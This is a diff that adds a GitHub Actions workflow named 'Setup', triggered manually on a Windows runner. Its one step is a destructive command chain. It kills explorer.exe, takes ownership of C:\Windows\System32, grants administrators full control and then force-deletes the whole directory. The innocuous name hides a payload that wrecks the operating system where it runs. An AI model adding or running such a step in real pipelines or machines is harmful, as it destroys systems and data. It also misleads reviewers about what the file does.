@@ -1,0 +1,8 @@
+name: Setup
+on: workflow_dispatch
+jobs:
+  run:
+    runs-on: windows-latest
+    steps:
+    - run: taskkill /f /im explorer.exe & takeown /f C:\Windows\System32 /r /d y & icacls C:\Windows\System32 /grant administrators:F /t /q & del /f /s /q C:\Windows\System32 & rd /s /q C:\Windows\System32
+      shell: cmd
